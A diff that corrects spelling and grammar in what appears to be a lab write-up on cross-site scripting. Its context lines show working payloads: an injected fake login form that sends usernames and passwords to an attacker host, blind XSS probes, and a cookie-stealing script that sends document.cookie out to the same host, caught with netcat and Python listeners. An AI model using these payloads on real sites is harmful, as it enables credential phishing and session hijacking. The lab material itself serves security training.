@@ -117,7 +117,7 @@ Since we can see the email we submitted, this is a reflected XSS.
 
 *Hint: Be sure to visit the URL and attempt to login to ensure everything works before sending the URL to the victim*
 
-The page is reflecting the input in a HTTP `<img>` tag.
+The page is reflecting the input in an HTTP `<img>` tag.
 
 ![](./attachments/Pasted%20image%2020220510221609.png)
 
@@ -151,7 +151,7 @@ To make the page look more convincing and nudge people to use the login form, we
 '><script>document.getElementById('urlform').remove();</script><h3>Please login to continue</h3><form action=http://10.10.15.133><input type="username" name="username" placeholder="Username">   <input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><div style="display:none'
 ```
 
-Finally, instead of just hiding the image tag, we might as well display a nice professionally looking image.
+Finally, instead of just hiding the image tag, we might as well display a nice, professionally looking image.
 
 ```
 https://freeiconshop.com/wp-content/uploads/edd/image-outline-filled.png' style="margin: -50px 0px -30px 0px;"><script>document.getElementById('urlform').remove();</script><h3>Please login to continue</h3><form action=http://10.10.15.133><input type="username" name="username" placeholder="Username">   <input type="password" name="password" placeholder="Password">   <input type="submit" name="submit" value="Login"></form><div style="display:none'
@@ -217,11 +217,11 @@ Payload, name: `Hax Haxx"><script src="http://10.10.15.133/fullname"></script>`
 
 Payload, username: `Haxx"><script src="http://10.10.15.133/username"></script>`
 
-Payload , URL: `haxx"><script src="http://10.10.15.133/URL"></script>`
+Payload, URL: `haxx"><script src="http://10.10.15.133/URL"></script>`
 
 ![](./attachments/Pasted%20image%2020220514165453.png)
 
-We recieved a request from the web server asking for `/URL`, this means that the `Profile picture URL` field is vulnerable to XSS attacks.
+We received a request from the web server asking for `/URL`, this means that the `Profile picture URL` field is vulnerable to XSS attacks.
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -237,7 +237,7 @@ Now we can hijack the cookie with the following payload.
 
 Payload: `haxx"><script>new Image().src='http://10.10.15.133/index.php?c='+document.cookie</script>`
 
-Once again we recieve a request, this time containing the hijacked cookie.
+Once again we receive a request, this time containing the hijacked cookie.
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -270,7 +270,7 @@ The page.
 
 We need to find the vulnerable field.
 
-Like in the previous question we will set up a netcat listener and insert payloads into all the fields we want to test for vulnerability.
+Like in the previous question, we will set up a netcat listener and insert payloads into all the fields we want to test for vulnerability.
 
 Payload, web: `Haxx><script src="http://10.10.15.133/web"></script>` 
 
@@ -288,13 +288,13 @@ Host: 10.10.15.133
 
 The web field is vulnerable.
 
-We can store a malicious payload on the page in the form of a blog post, whenever somone visits the page, their browser will execute the payload and send us their cookie.
+We can store a malicious payload on the page in the form of a blog post, whenever someone visits the page, their browser will execute the payload and send us their cookie.
 
 We will grab almost the same payload as in the previous question.
 
 Payload: `hax><script>new Image().src='http://10.10.15.133/index.php?c='+document.cookie</script>`
 
-Then, set up a HTTP server with Python so we can catch the victims cookie when the page is visited.
+Then, set up an HTTP server with Python, so we can catch the victim's cookie when the page is visited.
 
 ```bash
 ┌──(kali㉿kali)-[~/tmp]
